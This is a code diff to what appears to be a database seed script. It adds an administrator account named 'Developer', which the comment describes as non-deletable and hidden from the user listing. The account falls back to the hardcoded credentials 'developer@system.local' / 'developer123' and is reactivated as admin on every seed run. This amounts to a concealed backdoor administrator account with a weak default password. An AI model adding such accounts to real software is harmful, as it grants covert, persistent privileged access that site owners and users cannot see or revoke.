@@ -22,6 +22,25 @@ async function main() {
     },
   })
 
+  // Create non-deletable developer admin (hidden from users listing)
+  const devEmail = process.env.DEV_ADMIN_EMAIL || 'developer@system.local'
+  const devPassword = await bcrypt.hash(process.env.DEV_ADMIN_PASSWORD || 'developer123', 10)
+  await prisma.adminUser.upsert({
+    where: { email: devEmail },
+    update: {
+      role: 'admin',
+      is_active: true,
+      name: 'Developer',
+    },
+    create: {
+      email: devEmail,
+      password: devPassword,
+      name: 'Developer',
+      role: 'admin',
+      is_active: true,
+    },
+  })
+
  
 }
 
